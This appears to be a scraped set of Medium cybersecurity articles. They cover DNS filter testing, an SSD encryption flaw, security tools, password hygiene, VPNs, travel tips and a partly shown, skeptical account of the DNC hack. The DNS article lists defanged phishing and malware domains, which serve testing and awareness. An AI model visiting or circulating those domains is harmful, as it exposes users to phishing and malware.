So today, I decide to test a few of the most popular filtered DNS resolvers that restrict access to malicious content. How good are they? Do they really improve the security of someone browsing the web? Are they worth the trouble?
We will find out…
I chose those popular (and free) services that are supposed to block access to malware, phishing and bad stuff in general:
I am not looking to test their performance. Or how fast they are. But I am trying to see how well they block access to malicious domains.
All these providers do very little to block access to malicious content. On a list with 30 random known-malicious domains, OpenDNS blocked 3 of them (10% success rate) and Comodo blocked other 4 (~10% success rate).
These domains were all blacklisted by Google Safe Browsing, some major antivirus engines and most of them on phishtank. Still, almost none of them got blocked.
Quad9 did not block any of those malicious domains. Read more for details.
To test the usefulness of these providers, I spent a few hours trying to find malicious domains. I researched a few sites from security providers, malware lists, phishing lists and sites like that. I also went to my own email looking for malicious links.
On each one, I visited the site itself to confirm that the phishing (or malware) was still active and live. After that, I did a DNS lookup using the specific service to check if the domain was blocked or allowed. Pretty simple.
Enough introductions, let's see how it went.
*Blocked by Google SafeBrowsing as deceptive. URL: aosieuuw[.]com[/]bigmoneydoc/new/home/
Quad9: Not BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedComodo Secure: Not BlockedYandex Safe: Not Blocked
None of them blocked the domain.
*Blocked by Google SafeBrowsing as deceptive. URL: pkgzmt[.]com/signin/
OpenDNS: BlockedQuad9: Not BlockedNorton Connect Safe: Not BlockedComodo Secure: Not BlockedYandex Safe: Not Blocked
Only OpenDNS blocked the domain.
*Blocked by Google SafeBrowsing as deceptive. URL: 0-facebook[.]com[/]
Comodo Secure: BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedQuad9: Not BlockedYandex Safe: Not Blocked
Only Comodo Secure blocked the domain.
*Blocked by Google SafeBrowsing as deceptive. URL: www[.]bhargavi.org[/]mainpayuk[/]
Comodo Secure: BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedQuad9: Not BlockedYandex Safe: Not Blocked
Only Comodo Secure blocked the domain.
*Blocked by Google SafeBrowsing, SiteAdvisor and Norton SafeWeb. URL: ibtrainings[.]com
Quad9: Not BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedComodo Secure: Not BlockedYandex Safe: Not Blocked
None of them blocked the domain (surprising that Norton did not block it as Norton SafeWeb API flags as malicious).
*Blocked by Sophos, Kaspersky, Fortinet. URL: santandernetweb[.]com
Quad9: Not BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedComodo Secure: Not BlockedYandex Safe: Not Blocked
None of them blocked the domain.
*Blocked by Google & ESET. URL: upgradepc[.]centraloperatingupgradesalways[.]stream
Quad9: Not BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedComodo Secure: Not BlockedYandex Safe: Not Blocked
None of them blocked the domain.
*Blocked by Google & ESET and Sophos. URL: adultpro[.]xyz
Quad9: Not BlockedOpenDNS: Not BlockedNorton Connect Safe: Not BlockedComodo Secure: Not BlockedYandex Safe: Not Blocked
None of them blocked the domain.
I was not happy with the results. The more domains I tested, the more disappointed I got with the results. I had more than 30 random malicious domains for my informal research, but only reported the first 8 above because almost all others had the same result: ""not blocked"".
I think the lesson here is clear: Google Safe Browsing does a lot better than almost any of the DNS-based filters and they can not be used alone for security. In fact, they seem to do very little to help block access to malicious domains.
Written by
","['Cybersecurity', 'DNS', 'Security', 'Intrusion Detection', 'Firewall']"
Doh! What My Encrypted Drive Can Be Unlocked By Anyone?,https://medium.com/asecuritysite-when-bob-met-alice/doh-what-my-encrypted-drive-can-be-unlocked-by-anyone-a495f6653581?source=tag_archive---------4-----------------------,"Many companies now use full disk encryption for their computers, especially for laptops on the move. So while the usage of TrueCrypt has faded, especially when its open source developers gave up maintaining the code, it has been up to Microsoft BitLocker to take over and become the tool of choice for encrypting disk drives.
But is it actually robust? Well, not if you read this paper [link]:
I cannot even start to explain how bad this discovery is for the industry, and a complete embarrassment for the vendors involved. The lack of integration between vendors seems almost negligent in the extreme.
The paper outlines that some SSD drives (including Samsung and Crucial) do not actually encrypt the data properly, and that they can be easily by-passed without a system password.
The manufacturers of the drives have been informed through ethical disclosure (in April 2018), and users are being asked to rely on software encryption rather than the embedded hardware encryption. A particular risk is Windows BitLocker — which has a virtual monopoly in the market place for complete disk encryption — as it often relies on the hardware encryption used in the SSD drives.
The affected disks include:
The research team did not run tests across all the available SSD disks, but found that the following disks could be compromised with a range of attacks:
The researchers investigated the MASTER PASSWORD CAPABILITY bit in the firmware and which can be set so that a factory-set Master password can unlock the drive. For the Samsung MX300 SSD it was found there was no need to set this bit as it could be reset by decrypting the RDS key. The master password thus protects the main encryption key used for the disk. In the case of the MX300 drive this is “” (an empty string!!!!!!!!!!!!!). Yes … you read that correctly … the password which releases the encryption key for the whole disk is an empty string (32 NULL characters — 32 0x00 byte values):
Within disk encryption, a system can either use software encryption (and where the data is encrypted before it is presented to the disk) or use hardware encryption (and where the operating system relies on the disk hardware to encrypt and decrypt). The setting for software or hardware encryption is defined in a Group Policy [here]. If the disk supports hardware encryption it will use that option. For the disks effected, a complete reinstall it required, and where the group policy is changed to software encryption. Otherwise a software encryption package named VeraCrypt is recommended as an alternative to BitLocker.
If you need to have full disk encryption, and you have an SSD drive, you just cannot trust hardware encryption. At least with software encryption the data is encrypted before it gets anywhere near your disk. A master password of “” (an empty string — or 32 NULL characters) is shocking, and negligence of the highest kind.
The researchers recommend using an open sourced (and auditable) software encryption method such as VeraCrypt, along with hardware encryption. VeraCrypt is based on the well-loved TrueCrypt open-sourced software distribution:
Written by
","['Encryption', 'Cybersecurity', 'Cryptography']"
Don’t Get Hacked: Tools You Can Use To Protect Your Online Identity,https://blog.producthunt.com/dont-get-hacked-a25fde00f869?source=tag_archive---------2-----------------------,"Hacking is on everyone’s mind to some degree lately—especially with the recent WikiLeaks/CIA fiasco. If you’re worried about how events like this potentially impact your security and privacy, you’re not alone. Protecting yourself from hacking is an ongoing challenge, so you might as well take the necessary precautions now.
Below, you’ll find a list of 15 tools that will make you less vulnerable to tracking, hacking, and other shady internet shenanigans. Even if it takes some time to integrate these tools, it’s worth the effort if it keeps you and your information safe.
Browse safely on public WiFi with this VPN for iOS.
Cloak keeps you safe on public WiFi with no hassle. There’s an auto-secure feature that makes this app turnkey; you don’t even need to remember that you have it on your phone. All you have to do is connect to a network, and you’ll be automatically protected. Cloak also knows which networks you trust, automatically securing your connection whenever you use an untrusted network. This is a painless way to safeguard against unwanted monitoring or DNS poisoning, and the clean UX makes it much easier (and more intuitive) to use than most other VPNs out there.
A minimalist open source password manager.
As maker Martin Kleinschrodt puts it, “a password manager (or a comparable tool) is something that basically everybody needs but almost nobody uses.” The reason? Many view password managers as a tool for power users and paranoid consumers. Padlock exists to make using a password manager more accessible to the average person. This tool focuses on simplicity and usability, so you won’t see many of the complex features found in other password managers here—just a secure storage space to keep your passwords safe via encryption, protected by a single master password.
Padlock is also completely open source, so anyone can inspect the code and offer contributions. This is meant to make the tool as transparent as possible–and allows you to double check that the code is free from unintended vulnerabilities. If you’re new to password managers, this is a straightforward, simple option to help you get started.
Protect your private data from being sent out.
Whenever you connect to the internet, various applications can send whatever information they want about you, wherever they want to send it. Sometimes, they do this upon your request—but other times they don’t…which is super shady. Little Snitch was created to intercept any unwanted connection attempts so you can decide how you want to proceed. You’ll be alerted whenever an application tries to connect with a server, giving you the opportunity to decide whether to deny or allow the connection. This helps you prevent any sensitive data from leaving your computer without your approval.
You can choose to put the app on “silent mode” when you don’t want to see connection warnings for a while. There’s also an inbound firewall, which helps you keep the same level of control for incoming connections. If you’re worried about the security of sensitive data on your devices, Little Snitch is a useful tool that will help you keep your information protected.
Get a new virtual card for every transaction.
Well, this is cool. Privacy gives you a brand new card number for every transaction you make online, which is meant to protect you from card fraud, identity theft, and data breaches. The process is simple: download the Chrome extension after you sign up, and when you check out on any website, the Privacy icon will appear in the card form. Just click on it to create a new card, and the rest of the form will autofill. Once the “card” is charged, money will be withdrawn out of a funding account of your choice. There are a bunch of fancy details about Privacy’s policy (which you can find here). The most important, though, is that this tool is PCI-DSS compliant, which means you can expect the same security standards your bank has.
Lock and unlock your Mac automatically with your iPhone.
This cool app will lock your laptop as soon as you walk away from it, and then unlock it when you return — magic! Here’s the idea: you carry your smartphone with you basically all of the time, so why not utilize this pre-existing behavior to keep all of your digital files and private data safe? Of course, the catch is that you actually have to have your phone with you for Tether to work properly. But if it secures your privacy and takes a step out of your workflow (no more manual computer log-ins!), then it’s worth trying.
End-to-end encrypted email.
ProtonMail is an encrypted inbox, making the emails you send completely invisible. The automatic end-to-end encryption means the company cannot decrypt and read your emails—so they can’t be shared with third parties. You don’t need any personal information to secure your email account, and ProtonMail doesn’t keep any IP logs that could be linked to your anonymous email account, either. Even better? The inbox itself was designed for maximum productivity so you can read, organize, and send email efficiently. If you’re worried about your email privacy, this is the solution you’ve been waiting for.
A list of websites and whether they support 2FA.
Many security experts argue that 2FA should be a norm on every site that requires you to log in. Unfortunately, many websites don’t require two factor authentication. What you’ll find on the Two Factor Auth (2FA) site is straightforward and simple: a list of websites, along with information about whether they support 2FA. Use this site to utilize 2FA on your own accounts whenever possible—from your bank to gaming applications to entertainment websites. This is also a great resource if you’re choosing, say, a hosting service and want to make sure you pick a company that utilizes 2FA.
Create a recipe and forget your passwords.
Password Chef is a clever approach to password management. The app will help you design a “recipe” (i.e. personal algorithm), which generates complex and unique passwords for each of your accounts that you can remember even without sticky notes and password managers. Even though security breaches are becoming more commonplace, many of us still don’t take the precautions we should, like using a completely different password for every site. The result? It becomes much easier for a hacker to gain access to your most valuable accounts — banks, email, file hosting, social media, and more. Here’s one example of a recipe via Password Chef (clever name):
Give this one a try — especially if you’d prefer not to keep your passwords stored somewhere on the Internet, and would rather remember them instead (without the mental load required to memorize dozens — or hundreds — of unique password combinations).
Once you get to know the product, it isn’t surprising that 1Password is revered by many individuals and companies. With this app, you’ll only ever need to remember one password. No more trying to memorize autogenerated passwords like “4ndO23bC0q8Nm6Z.” No more using your birthday or your mother’s maiden name over and over again. And definitely no more searching for a sticky note somewhere in your office where you keep your Gmail account information. All of your other passwords and important information will be protected behind your master password, which only you know. This is a great—and most importantly, super easy—way to keep your information safe.
Securely share information with your team.
…Oh, hey! There’s a team version, too!
There’s nothing worse than trying to hunt down a password to a team account at work. Which, of course, you often end up getting via email or chat (the internet security police are pissed right about now). Sometimes, keeping track of team accounts and passwords can feel like an extra job.
1Password for Teams works like the individual version, but features emphasize password sharing. You can also share more than just passwords; use it to manage sensitive finances and documents, as well. This is definitely worth integrating into your team’s set of tools — especially if you find yourself needing to share secure documents and account information often.
Browse the internet anonymously.
We know Google is the holy grail for search, but if you’re looking to browse the internet anonymously (like, really), Tor Browser 6.0 is a great option. The software protects you by “bouncing your communications around a distributed network of relays run by volunteers around the world.” In other words, it prevents anyone who may be monitoring your internet connection from learning what site you visit—and it also prevents the sites you visit from finding your location and other information about you. This is the ultimate search tool if you want to protect yourself from unwanted traffic analysis and network surveillance.
Team password manager, cloud identity, and access management.
Meldium is a super simple tool that gives you secure access to all of your apps. The best feature? You’ll automatically be logged into your favorite websites and apps without needing to type in usernames and passwords. This tool (which the Product Hunt team uses) also makes the onboarding process much easier. When someone new joins your company, Meldium will automatically create their accounts on every web application your team needs. No more spending a ton of time getting new teammates set up with all of the necessary accounts; now it’s easy to share website and app data without ever exchanging a password.
Control who can send you email.
If you’re tired of the barrage of unwanted newsletters, sales emails, and updates from companies you aren’t interested in hearing from, check out Throttle. This tool is a dream if you’re drowning in unwanted emails. You can control what emails make it to your inbox, find out who sells or steals your address, and combine all mass mailings into a single digest.
How does it work? Whenever you sign up for something online, you’ll see a little thunderbolt next to the form field. Click that, and a random email address is generated and filled into the form. Any emails from those companies will automatically go into a daily digest so you can view it whenever you want without having to deal with a ton of individual emails in your inbox. If a sender is emailing you too frequently, you can revoke their access and they can no longer email you. You’ll also be alerted whenever someone tries to sell or steal your email address, and revoke that sender’s access, as well. Finally—your inbox is actually yours again.
Quickly scan your cloud for exposed sensitive data.
Marshal is a cloud-based data scanning tool that goes through your files on various cloud storage platforms like Dropbox, Google Drive, and Box to identify sensitive information. You do have to grant the company access to your cloud services first; then Marshal will create a temporary copy of each scannable file. It will identify credit card numbers, phone numbers, email addresses, and Social Security numbers so you know the number of threats found in your documents—and can act on each one as you see fit. This is a useful resource if you’re looking to keep your cloud storage services safe.
An iPhone app that blocks ads, tracking, and malicious content.
Better truly lives up to its name. The creators make it a point that this app is not an ad blocker; it’s a behavioral ad blocker. The goal? “Make the web safer, lighter, and faster in line with the principles of ethical design.” This is a really thoughtful app, designed to protect you from sites that track your behavior online (which feels like it happens all the time these days). So why this content blocker? Better goes beyond an app; it’s an educational resource with in-depth research and documentation on trackers and editorial spotlights. This blurb says it all:
…enough said.
We hope you found something on this list that you can use to keep yourself and your data safe. Looking for more products to keep you from getting hacked? Check out the comprehensive list here on Product Hunt:
Written by
","['Top Products', 'LIVE', 'Books', 'Company', 'Archive', '� Newsletter', 'Tech', 'Security', 'Cybersecurity', 'Startup', 'Product']"
Don’t Get Pwned: A Guide to Safer Logins - Mozilla Internet Citizen - Medium,https://medium.com/mozilla-internet-citizen/dont-get-pwned-a-guide-to-safer-logins-e15628ba385a?source=tag_archive---------4-----------------------,"Richard Barnes, Firefox Security Lead
More and more of the sensitive, valuable things in our life are guarded through password-protected online accounts — love letters, medical records, bank accounts and more. Web sites use login procedures to protect those valuable things. As long as someone can’t log into your account, they can’t read your email or transfer money out of your bank account. As we live our lives online, how should we protect our logins?
tl;dr:
Most logins today are protected by a password. If an attacker can get your password, he can access your account and do anything you could do with that account. So when you ask how secure your account is, you’re really asking how safe your password is. And that means you have to think about all the different ways that an attacker could access your account’s password:
To keep your login safe, you need to prevent as many of these as possible. Each risk has a different corresponding mitigation.
It’s easy to prevent attackers from stealing your password when you log into an unencrypted website: Never type your password unless you see a lock icon in the URL bar, like this:
The lock means that the website you’re using is encrypted, so that even if someone is watching your browsing on the network (like another person on a public WiFi hotspot), they won’t be able to see your password. Browsers are starting to roll out features that warn you when you’re about to enter your password on an unencrypted site.
Your browser also helps keep you informed about how trustworthy sites are, to help keep you safe from phishing. On the one hand, when you try to visit a website that is known to be a phishing site, any major browser will display a full-screen warning — pay attention and don’t use that site!
On the other hand, when you’re talking to a site that has provided proof of its legal identity, the browser will show you that identity. So for example, when you go to download Firefox, you can know that you’re getting it from Mozilla.
In general, the best defense against phishing is to be suspicious of what you receive, whether it shows up in email, a text message or on the phone. Instead of taking action on what someone sent you, visit the site directly. If an email says you need to reset your Paypal password, don’t click the link. Type in paypal.com yourself. If the bank calls, call them back.
The secret to preventing guessing, theft or password reset is a whole lot of randomness. When attackers try to guess passwords, they usually do two things: 1) Use “dictionaries” — lists of common passwords that people use all the time, and 2) make some random guesses. The longer and more random your password is, the less likely that either of these guessing techniques will find it.
When an attacker steals the password database for a site that you use (like LinkedIn or Yahoo), there’s nothing you can do but change your password for that site. That’s bad, but the damage can be much worse if you’ve re-used that password with other websites — then the attacker can access your accounts on those sites as well. To keep the damage contained, always use different passwords for different websites. There are also sites like have i been pwned where you can subscribe to be notified if your account is in one of the password databases that has been stolen.
Finally, most websites have a password recovery system that lets you recover your password if you’ve forgotten it. Usually these systems make you answer some “security questions” before you can reset your password. The answers to these questions need to be just as secret as your password. Otherwise, an attacker can guess the answers and set your password to something he knows.
Randomness can be a problem, since the security questions that sites often use are also things people tend to know about you, like your birthplace, your birthday, or your relatives’ names, or that can be gleaned from sources such as social media. The good news is that the website doesn’t care whether the answer is real or not — you can lie! But lie productively: Give answers to the security questions that are long and random, like your passwords.
Now, all of this sounds pretty intimidating. The human mind isn’t good at coming up with long sequences of random letters, let alone remembering them. You can use a password manager like 1Password, LastPass, or Dashlane to help improve your password hygiene. They will generate strong passwords for you, remember them for you, and fill them into websites so you don’t have type them in.
You do take on some risk by using one of these password managers, since they create a database that has all your passwords in it. However, all reputable password managers encrypt their databases with a “master password.” The master password is safer from theft than normal passwords: Because it never gets sent to a server (just used on your computer to encrypt the database), an attacker has to break into your computer in particular, rather than a server where he can harvest millions of accounts. And because you only have to remember one master password, you can make it extra strong. So in general, it’s much more likely that you’ll have an account breached due to not using a password manager (e.g., a weak or re-used password) than that someone will both steal the your password manager’s database and guess the master password.
Even if you can’t figure out how to use a password manager, sometimes the simplest, least glamorous technology is also pretty secure:
Just keep your written passwords in a safe place!
The other major step you can take to protect your account is to add a “second factor” to the login process. In most cases, the second factor is tied to your phone, which means that even if an attacker has your password, they can’t log in to your account unless they also have your phone. (And vice versa — if your phone gets stolen, they can’t log in unless they get your password.)
In order to enable two-factor authentication (or “2FA”), you’ll need to associate your phone with your account on the website. Each website will provide instructions, but it usually involves either entering your phone number or scanning a barcode with a special app. Then, when you go to log in, the website will ask you for a code from your phone. If an attacker doesn’t have your phone, he can’t get the code, so he can’t log in.
2FA provides much better security than passwords alone, but not every website supports it. You can find a list of websites that support 2FA at https://twofactorauth.org, as well as a list of sites that don’t support 2FA and ways you can ask them to add support.
For better or worse, we’re going to be using passwords to protect our online accounts for the foreseeable future. Use passwords that are strong and different for each site, and use a password manager to help. Set long, random answers for security questions (even if they’re not the truth). And use two-factor authentication on any site that supports it.
Following these steps takes some discipline and will make it harder to log in sometimes. But in today’s Internet, where thousands of passwords are stolen every day and accounts are traded on the black market, it’s worth some inconvenience to keep your online life safe.
Originally published at blog.mozilla.org on January 25, 2017.
Written by
","['Net Neutrality', 'Encryption', 'Security', 'Passwords', 'Cybersecurity']"
Don’t Use a VPN at Home - OneZero,https://onezero.medium.com/dont-use-a-vpn-at-home-dd67e753aef5?source=tag_archive---------0-----------------------,"Public Wi-Fi, especially hotspots without passwords (like at cafés and malls), are where you should always be using a VPN. When your device communicates with a Wi-Fi hotspot, there isn’t a beam of radio waves connecting you to the router. Instead, the router and your device blast signals in every direction with the hope that the signal will eventually reach the router’s antenna.
Of course, this works most of the time, because you’re reading this post right now. Even in the event that a few packets don’t find their way, TCP has you covered. TCP is an internet protocol that ensures each end of the connection receives all the packets sent to it. Should a packet not arrive, it is sent again until delivery is complete.
How does this relate to VPNs? Well, because the signals are being sent in every direction, a hacker with the proper equipment, which actually isn’t too expensive, can collect those packets without you or the router noticing. Generally, password-protected Wi-Fi utilizes encryption that ensures what the hackers pick up is a jumbled and useless mess that can’t be reassembled. However, public Wi-Fi is often not password protected, meaning you don’t benefit from encryption. A VPN makes up for that by providing its own form of encryption that protects against snooping.
Not only does a VPN provide its own encryption, which prevents hackers from knowing what you’re doing online, they often contain another layer of defense. Many modern VPNs will ensure that the data being sent is not only received, but also received without being tampered with. Even in the event that someone attempts to inject unwanted data into a packet, the VPN should detect it and protect you from that kind of attack.
If a hacker is sitting right outside your house collecting every single packet your device sends, there’s nothing they can do with it.
I’m willing to bet that your home Wi-Fi is protected by a password. Even if you’re unaware of the security benefits, having a password simply prevents people from using up your bandwidth. Modern routers make setting up and updating the password a relatively easy process, with the hardest part being updating the passwords on all your devices.
Since you most likely have a password set up for your Wi-Fi network, you’re getting the protection the encryption offers. If a hacker is sitting right outside your house collecting every single packet your device sends, there’s nothing they can do with it. This only works if the hacker can’t guess your password, however, so be sure to use a secure one.
One argument for using a VPN at home is if you don’t trust your ISP. That may be because you think the company is spying on you and selling your data, or it’s taking advantage of the lack of net neutrality and blocking websites unless you pay extra. Either way, a VPN is the perfect solution, right?
Well, not really. Remember, all a VPN does is securely tunnel your traffic to a server, after which there is no extra layer of encryption protecting you. Basically, using a VPN pushes the risk down the line from your home ISP to the VPN provider’s ISP.
Whether that puts you in a better situation largely depends on the VPN provider. Reputable — generally meaning paid — VPN services are most likely fine, because they’re making money from you paying them. Free VPN providers, however, often rely on selling user data to cover the costs of their services and make a profit.
Even if you trust your VPN provider, there are still other aspects to consider.
Because VPNs add another layer of encryption to your internet traffic, your latency will go up and speeds will go down. This is an acceptable trade-off when you’re on public or otherwise untrusted Wi-Fi, because a bit of slowdown is worth being secure. But when using a VPN at home, the trade-off doesn’t make nearly as much sense. The more physically distant the VPN server, the higher the latency and the slower speeds will become. If you’re lucky enough to have a VPN server close to your house, then the impact will be less noticeable — but it’s still there.
This advice is aimed at the general internet user who’s using a VPN to keep their internet traffic safe from hackers. At home, if you’re using a strong Wi-Fi password and HTTPS when it’s available, using a VPN won’t add much security to your internet browsing. Wi-Fi encryption will prevent nearby hackers from seeing what you’re doing, while HTTPS will protect you up to the web server itself.
Of course, the situation changes a bit when you’re using a VPN for both security and privacy. Assuming you take all the rights steps to hide your online identity, then using a VPN at home may make sense for your use case. Since you’re probably using a faraway VPN server to prevent online services from getting your approximate location, you’ll experience rather high latency and sluggish speeds. But if you care about your privacy enough to use a VPN 24/7, the trade-off is probably worth it for you.
I use a VPN at home, but it’s not because I want to hide from Google or as a protest against my ISP. (Okay, maybe it’s partially because I hate my ISP.) The main reason is so I can access my Raspberry Pi from anywhere in the world. Since I happen to use that Raspberry Pi as my main Wi-Fi router, everything gets routed through my VPN anyway.
But whenever I stream something or do anything else that’s bandwidth intensive, I switch to one of my other Wi-Fi networks without a VPN. In fact, my laptops usually aren’t connected to my VPN-enabled Wi-Fi connection, because I prefer speed and low latency over a bit of added privacy from my ISP.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'VPN', 'Privacy', 'Cybersecurity', 'Consumer Tech', 'Wifi']"
"Don’t Use Public USB Charging Stations, and Other Cyber Travel Tips",https://medium.com/swlh/dont-use-public-usb-charging-stations-and-other-cyber-travel-tips-6389e5371683?source=tag_archive---------9-----------------------,"Everyone is familiar with travel safety tips such as leaving valuables at home and keeping their hotel room locked, but few people give any thought to cybersecurity while traveling. Yet according to the 2019 IBM X-Force Threat Intelligence Index, the transportation industry is now ranked second for cyberattacks, up from tenth in 2017.
Hotels, airlines, car rental agencies, and other travel and transportation companies are treasure troves of information that can be put up for sale on the Dark Web, used to orchestrate other cyberattacks, or even leveraged for real-world blackmail or stalking. In addition to credit card numbers and personal identifying information (PII), hackers can abscond with detailed profiles of travelers’ travel patterns, including where they go and why, who they travel with, when and where they stay, and even things like what types of meals they have sent to their room. It is likely that Chinese nation-state hackers seeking to build travel profiles on government officials were responsible for the Marriott Starwood breach, which compromised 500 million of the hotel chain’s rewards program customers.
Hackers also target travelers themselves. Caleb Barlow, Vice President of X-Force Threat Intelligence at IBM Security, told Forbes that using public USB charging stations, such as those found at airports, “is kind of like finding a toothbrush on the side of the road and deciding to stick it in your mouth.” Turns out hackers can compromise these stations so that they transfer data or install malware on any device that connects to them. Barlow recommends using a plug-in wall charger, a portable charger, or a Juice Jack Defender, a small gadget that sits between your device and the public station and ensures that only voltage gets passed between them.
Here are more tips to keep your systems and hardware safe while traveling for business or leisure.
Before you leave
Pack only what you need. The more electronic devices you take, the more you’ll have to keep safe.
Avoid traveling with devices that contain sensitive information. If your trip is for business, ask your employer about giving you a loaner laptop or phone.
Update everything. Make sure the operating systems and software on all of your devices are up-to-date. (You should be doing this anyway.)
Lock your devices down. Protect all of your devices with strong passwords, multi-factor authentication, or a biometric lock, disable file-sharing options, and turn off Bluetooth. If you must travel with a device that contains sensitive data, use encryption software to encrypt it.
Turn off network auto-connect. Turn off the feature on your cell phone that allows it to automatically connect to available WiFi networks, and keep it off. Hackers often set up phony “honeypot” networks, then observe the activity and capture data from anyone who connects to them.
While you’re on the road
Avoid using public WiFi. The free public WiFi offered to guests at hotels, airports, and restaurants is as dangerous as public USB chargers. Tether to your phone instead. If you must connect to a public WiFi network, use a VPN; if you’re traveling for business, your employer may provide you with one.
Protect your electronic devices like you do your wallet. Never leave your phone, laptop, or other electronic device unattended in public, not even for a moment. Make sure your laptop bag never leaves your possession. Lock up anything you leave in a hotel room. Keep your phone tucked inside an interior pocket, and don’t set it down on a counter while you reach into your purse or wallet. Never let a stranger “borrow” your phone or any other device; it takes only a moment for a hacker to install malware on it, or break into a run and vanish into a crowd.
Don’t share your movements on social media. It’s tempting to share vacation photos or virtually “check in” to your hotel and attractions. The problem is that your friends and family may not be the only ones following along; criminals could also be watching, and if they know you’re at a theme park, they know nobody is in your hotel room, office, or home. Save the photos and stories for when you get home.
Don’t connect your phone to your rental car. Many rental cars offer Bluetooth connectivity, but these vehicles may retain your personal information, such as your contact list, even after you’ve terminated the connection. Bluetooth connectivity also leaves your device vulnerable to hackers.
Use credit cards, not debit cards. Point-of-sale systems are notoriously insecure. If your debit card information is stolen, hackers will gain access to your bank account, and you also won’t have as much recourse to get fraudulent charges refunded as you would with a credit card.
Written by
","['Top Story', '▫️Medium Things▫️', 'Cybersecurity', 'Technology', 'Travel', 'Security', 'Information Security']"
DUMBSTRUCK: a HomeFront Intelligence Report on how America was conned about the DNC hack,https://medium.com/@HFINetwork/dumbstruck-how-crowdstrike-conned-america-on-the-hack-of-the-dnc-ecfa522ff44f?source=tag_archive---------1-----------------------,"Part One: Cozy Bear and Fancy BearTo hear Dmitri Alperovitch tell it, the moment had all the tension of a Hollywood blockbuster: a phone call in the early morning hours, a quick exchange of words, and a sudden, dramatic realization — the Democratic National Committee was under attack. “Are we sure it’s Russia?,” Alperovitch asked the security analyst on the other end of the line. The analyst, a former intelligence officer trained in the art of cyber warfare, told Alperovitch that there was no doubt.
Alperovitch is the 37-year-old chief technical officer of the cyber security company CrowdStrike. CrowdStrike’s proprietary cyber security software, named Falcon Host, a “next generation” endpoint security technology, had been installed on the servers of the Democratic National Committee just the night before, in response to a suspected intrusion. Within “ten seconds” the software signaled a positive hit — the malware that had been detected by Falcon had the same traits as those previously used by two “advanced persistent threats,” or APTs, known to CrowdStrike by the code names Cozy Bear and Fancy Bear.
Cozy Bear was assessed by Alperovitch to be run by the Russian Federal Security Service, or FSB; Fancy Bear was attributed to Russian military intelligence, or the GRU. CrowdStrike’s Falcon software showed that Cozy Bear had been active in the DNC server since the summer of 2015, mapping out directories and exfiltrating data. Fancy Bear had penetrated the DNC server in April 2016, and had stolen some files related to opposition research.
Alarmed by what Falcon had uncovered, Alperovitch made a phone call to Shawn Henry, a former senior FBI official who had headed CrowdStrike’s incident response capability since being recruited straight from retirement in 2012. Henry and his team deployed an intelligence tool, Falcon Overwatch, to assist in what CrowdStrike terms “the incident response engagement.” According to CrowdStrike, Falcon Overwatch is a 24/7 global operations center staffed by “an elite group of cyber intrusion detection analysts and investigators” who hunt for adversary activity and malware in a client’s server.
“The OverWatch team saw activity as it occurred with ‘over the shoulder’ observation of ‘hands on keyboard’ as command line activity occurred,” Henry recalled in a company after-action report. “This real-time information provided the CrowdStrike Services team with additional indicators of compromise to examine, which in turn helped reveal what the attackers were trying to accomplish.”
CrowdStrike has a corporate motto: “You don’t have a Malware Problem, You Have an Adversary Problem.” The ethos behind this motto, as explained by Adam Meyers, who runs CrowdStrike’s Global Threat Intelligence Team, is the notion that by focusing on the adversary “you are dealing with the problem, not just a symptom of the problem. Malware deals with the symptom.” Adversaries, Meyers notes, “are the humans behind the attacks. We spent years in security focusing on malware and exploits and techniques, but not on who is perpetrating them. There are humans behind the attacks, so we watch for patterns, use intel to zero in on the human element. We ask who they are, what their motivation is and what types of things they are likely to do in the future.”
On April 29, 2016, when the DNC became aware its servers had been penetrated, an emergency meeting was held between the Chairwoman of the DNC, Debbie Wasserman-Schultz, DNC’s Chief Executive, Amy Dacey, the DNC’s Technology Director, Andrew Brown, and Michael Sussman, a lawyer for Perkins Coie, a Washington, DC law firm that represented the DNC. Sussman took control of the meeting, setting out the DNC’s agenda when it came to dealing with the cyber attack on its server. The three most important questions, Sussman declared, were what data was accessed, how was it done, and how can it be stopped?
The one question Sussman, a former federal prosecutor who focused on computer crimes, did not ask was, who did it?
It took the DNC four days to decide to bring in an outside vendor to investigate the breach of its servers. In the end, it was Sussman who made the call to Shawn Henry at CrowdStrike. The call was made on May 4; by May 5 CrowdStrike had installed its FalconHost software that had triggered the Russian attribution.
This wasn’t the first time CrowdStrike had been called in by the DNC. In December 2015 it tapped the company to conduct an audit of the circumstances surrounding a breach of security involving the DNC’s party-administered voter file system — specialized software developed by the company NGP VAN known as VoteBuilder. Over the course of five weeks, CrowdStrike examined administrative logs from the DNC to assess user activity within the VoteBuilder system, and conducted a forensic examination of two other systems belonging to the campaign of Vermont Senator Bernie Sanders. The results of the CrowdStrike investigation were released on April 29, 2016 — the same day the breach of DNC servers was detected.
Acting on FalconHost’s May 5 alert, CrowdStrike poured over the data. FalconHost had found indicators — malware, techniques, and patterns of behavior — that suggested two APT’s, Cozy Bear and Fancy Bear, were behind the cyber attack on the DNC. Shawn Henry now deployed CrowdStrike’s Overwatch capabilities to answer the questions Sussman had asked: What data had been compromised, how did this compromise occur, and how could the DNC prevent future compromise?
But CrowdStrike had to proceed carefully. If the humans behind either Cozy Bear or Fancy Bear detected that their respective hacks had been discovered, they would be able to cover their tracks and, worse, burrow so deep into the DNC server system it could never be deemed secure.
CrowdStrike, however, had built its corporate reputation on being more proactive than reactive when it came to cyber security. Using what it called Enterprise Adversary Assessment, CrowdStrike sought not only to locate the perpetrator of the attack, but also track them back into their systems and prevent them from ever returning. One of the tools CrowdStrike advertised in this regard involves so-called “attractive data” that had been tagged with tracking malware and placed in the compromised server. Once the hacker fell for the trap, and exfiltrated the file in question, CrowdStrike would be able to follow it back through the adversary’s network, helping build a picture of the adversary’s infrastructure, and hopefully identify what data had been previously stolen and where it resided. Crowdstrike also advertised offensive strategies designed to limit the number and severity of future attacks by disrupting the attackers’ infrastructure using undisclosed techniques.
